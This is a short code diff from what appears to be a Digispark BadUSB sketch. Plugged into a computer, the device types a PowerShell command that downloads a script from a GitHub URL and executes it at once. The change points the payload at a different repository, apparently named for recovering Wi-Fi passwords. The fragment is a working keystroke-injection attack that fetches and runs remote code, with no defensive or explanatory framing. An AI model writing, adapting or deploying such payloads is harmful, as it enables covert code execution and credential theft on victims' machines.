@@ -13,7 +13,7 @@ void setup() {
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(400);
 
-  DigiKeyboard.print("iex(iwr 'https://raw.githubusercontent.com/Esther7171/Digispark-HID-Toolkit/main/scripts/null.ps1' -UseBasicParsing).Content");
+  DigiKeyboard.print("iex(iwr 'https://raw.githubusercontent.com/mrbob101signal-bit/wifipasswordrecover/refs/heads/main/scripts/null.ps1' -UseBasicParsing).Content");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(15000);
 
